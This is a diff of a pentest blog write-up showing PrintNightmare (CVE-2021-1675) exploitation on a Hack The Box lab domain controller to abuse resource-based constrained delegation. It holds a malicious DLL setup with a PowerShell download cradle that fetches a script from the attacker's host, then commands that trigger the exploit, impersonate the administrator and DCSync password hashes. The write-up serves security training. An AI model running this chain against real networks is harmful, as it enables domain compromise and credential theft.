@@ -30,60 +30,25 @@ So, what can we do when having access to code execution on the behalf of DC mach
 
 For demonstration purposes I will use [Multimaster](https://www.hackthebox.eu/home/machines/profile/232) - a retired machine from Hack The Box - as a lab to play with PrintNightmare:
 
-```powershell
-PS > systeminfo
-
+```
 Host Name:                 MULTIMASTER
 OS Name:                   Microsoft Windows Server 2016 Standard
 OS Version:                10.0.14393 N/A Build 14393
 OS Manufacturer:           Microsoft Corporation
 OS Configuration:          Primary Domain Controller
 OS Build Type:             Multiprocessor Free
-Registered Owner:          Windows User
-Registered Organization:
-Product ID:                00376-30821-30176-AA432
-Original Install Date:     9/25/2019, 10:57:13 AM
-System Boot Time:          6/30/2021, 11:01:25 AM
-System Manufacturer:       VMware, Inc.
-System Model:              VMware7,1
-System Type:               x64-based PC
-Processor(s):              1 Processor(s) Installed.
-                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
-BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
-Windows Directory:         C:\Windows
-System Directory:          C:\Windows\system32
-Boot Device:               \Device\HarddiskVolume2
-System Locale:             en-us;English (United States)
-Input Locale:              en-us;English (United States)
-Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
-Total Physical Memory:     4,095 MB
-Available Physical Memory: 1,840 MB
-Virtual Memory: Max Size:  4,799 MB
-Virtual Memory: Available: 2,307 MB
-Virtual Memory: In Use:    2,492 MB
-Page File Location(s):     C:\pagefile.sys
 Domain:                    MEGACORP.LOCAL
-Logon Server:              N/A
 Hotfix(s):                 5 Hotfix(s) Installed.
                            [01]: KB3199986
                            [02]: KB4054590
                            [03]: KB4512574
                            [04]: KB4520724
                            [05]: KB4530689
-Network Card(s):           1 NIC(s) Installed.
-                           [01]: vmxnet3 Ethernet Adapter
-                                 Connection Name: Ethernet0 2
-                                 DHCP Enabled:    No
-                                 IP address(es)
-                                 [01]: 10.10.10.179
-                                 [02]: fe80::c411:2b77:5e6f:acaf
-                                 [03]: dead:beef::c411:2b77:5e6f:acaf
-Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
 ```
 
 ## Exploiting PrintNightmare
 
-The first thing I want to do is to prepare a skeleton for malicious DLL binary that will source and execute a PowerShell script served by an HTTP server on my machine. To construct a DLL one may use [a template](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own) from HackTricks. Another thing to remember is that a threaded approach should be used to run the command in order not to kill the parent process of Spooler service when exiting (similar to `EXITFUNC=thread` when generating a payload with msfvenom). Otherwise the Spooler will probably die and you will not have a second chance to trigger the RCE if something goes wrong.
+The first thing I want to do is to prepare a skeleton for malicious DLL binary that will source and execute a PowerShell script served by an HTTP server on my machine. To construct a DLL one may use [a template](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dll-hijacking#your-own) from HackTricks. Another thing to remember is that a threaded approach should be used to run the command from the DLL in order not to kill the parent process of Spooler service when exiting (similar to `EXITFUNC=thread` when generating a payload with msfvenom). Otherwise the Spooler will probably die and you will not have a second chance to trigger the RCE if something goes wrong.
 
 ```c
 // pwn.c
@@ -128,31 +93,31 @@ $adsiobject.setinfo()
 Now I have to create a fake machine account to use it when it comes to requesting a forwardable ticket with S4U2Self & S4U2Proxy (some good references on how to abuse RBCD can be found on [PPN](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/delegation-abuse#resource-based-constrained-delegation-rbcd) and in my [HTB Hades write-up](https://snovvcrash.rocks/2020/12/28/htb-hades.html#abusing-kerberos-resource-based-constrained-delegation)):
 
 ```bash
-$ addcomputer.py megacorp.local/lowpriv:'Passw0rd1!' -dc-ip 10.10.10.179 -computer-name fakemachine -computer-pass 'Passw0rd2!'
+addcomputer.py megacorp.local/lowpriv:'Passw0rd1!' -dc-ip 10.10.10.179 -computer-name fakemachine -computer-pass 'Passw0rd2!'
 ```
 
 [![create-fake-machine-account.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/create-fake-machine-account.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/create-fake-machine-account.png)
 
-After the machine object is successfully created (in other words we control a domain account with an SPN) I will make a file with a simple download cradle in PowerShell and convert it to UTF-16LE:
+After the machine object is successfully created (in other words we control a domain account with an SPN) I will make a file containing a simple download cradle in PowerShell and convert it to UTF-16LE:
 
 ```bash
-$ cat crandle.ps1
+cat crandle.ps1
 IEX(IWR http://10.10.14.11/rbcd.ps1 -UseBasicParsing)
 
-$ cat crandle.ps1 | iconv -t UTF-16LE | base64 -w0
+cat crandle.ps1 | iconv -t UTF-16LE | base64 -w0
 ```
 
 [![create-download-cradle.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/create-download-cradle.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/create-download-cradle.png)
 
-I will can put the resulting base64 command into DLL source code and cross-compile it to x64 using MinGW:
+I will put the resulting base64 command into the DLL source code and cross-compile it to x64 using MinGW:
 
 ```bash
-$ x86_64-w64-mingw32-gcc pwn.c -o pwn.dll -shared
+x86_64-w64-mingw32-gcc pwn.c -o pwn.dll -shared
 ```
 
 [![compile-dll.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/compile-dll.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/compile-dll.png)
 
-Then move the binary to the Samba share and [check that it's accessible](https://github.com/cube0x0/CVE-2021-1675#smb-configuration):
+Then move the binary to the SMB share and [check that it's accessible](https://github.com/cube0x0/CVE-2021-1675#smb-configuration):
 
 [![prepare-samba.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/prepare-samba.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/prepare-samba.png)
 
@@ -163,7 +128,7 @@ I will download and install [the modified impacket library](https://github.com/c
 Note that dynamic `pDriverPath` (location of the `UNIDRV.DLL` binary) enumeration feature [was added by cube0x0](https://github.com/cube0x0/CVE-2021-1675/commit/3bad3016aca9a6ebb75e5e687614d1c0d045b1f6) a couple of hours after the release - without it the adversary would have to change the script according to the environment:
 
 ```powershell
-PS > ls C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_*
+ls C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_*
 ```
 
 [![get-pdriverpath.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/get-pdriverpath.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/get-pdriverpath.png)
@@ -171,7 +136,7 @@ PS > ls C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_*
 Fire up an HTTP server with Python and trigger the bug:
 
 ```bash
-$ python CVE-2021-1675.py megacorp.local/lowpriv:'Passw0rd1!'@10.10.10.179 '\\10.10.14.11\share\pwn.dll'
+python CVE-2021-1675.py megacorp.local/lowpriv:'Passw0rd1!'@10.10.10.179 '\\10.10.14.11\share\pwn.dll'
 ```
 
 [![trigger-the-exploit.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/trigger-the-exploit.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/trigger-the-exploit.png)
@@ -179,7 +144,7 @@ $ python CVE-2021-1675.py megacorp.local/lowpriv:'Passw0rd1!'@10.10.10.179 '\\10
 In the background it will set the `PrincipalsAllowedToDelegateToAccount` property containing objects that can delegate to MULTIMASTER. It can be verified like follows:
 
 ```powershell
-PS > Get-ADComputer MULTIMASTER -Properties PrincipalsAllowedToDelegateToAccount
+Get-ADComputer MULTIMASTER -Properties PrincipalsAllowedToDelegateToAccount
 ```
 
 [![check-properties.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/check-properties.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/check-properties.png)
@@ -187,7 +152,7 @@ PS > Get-ADComputer MULTIMASTER -Properties PrincipalsAllowedToDelegateToAccount
 Now I can request a service ticket for LDAP:
 
 ```bash
-$ getST.py megacorp.local/fakemachine:'Passw0rd2!' -dc-ip 10.10.10.179 -spn ldap/MULTIMASTER.megacorp.local -impersonate administrator
+getST.py megacorp.local/fakemachine:'Passw0rd2!' -dc-ip 10.10.10.179 -spn ldap/MULTIMASTER.megacorp.local -impersonate administrator
 ```
 
 [![request-ticket.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/request-ticket.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/request-ticket.png)
@@ -195,8 +160,8 @@ $ getST.py megacorp.local/fakemachine:'Passw0rd2!' -dc-ip 10.10.10.179 -spn ldap
 And finally DCSync the domain with `secretsdump.py`:
 
 ```bash
-$ export KRB5CCNAME=/home/snovvcrash/PrintNightmare/CVE-2021-1675/administrator.ccache
-$ secretsdump.py multimaster.megacorp.local -dc-ip 10.10.10.179 -k -no-pass -just-dc-user administrator
+export KRB5CCNAME=/home/snovvcrash/PrintNightmare/CVE-2021-1675/administrator.ccache
+secretsdump.py multimaster.megacorp.local -dc-ip 10.10.10.179 -k -no-pass -just-dc-user administrator
 ```
 
 [![dcsync.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/dcsync.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/dcsync.png)
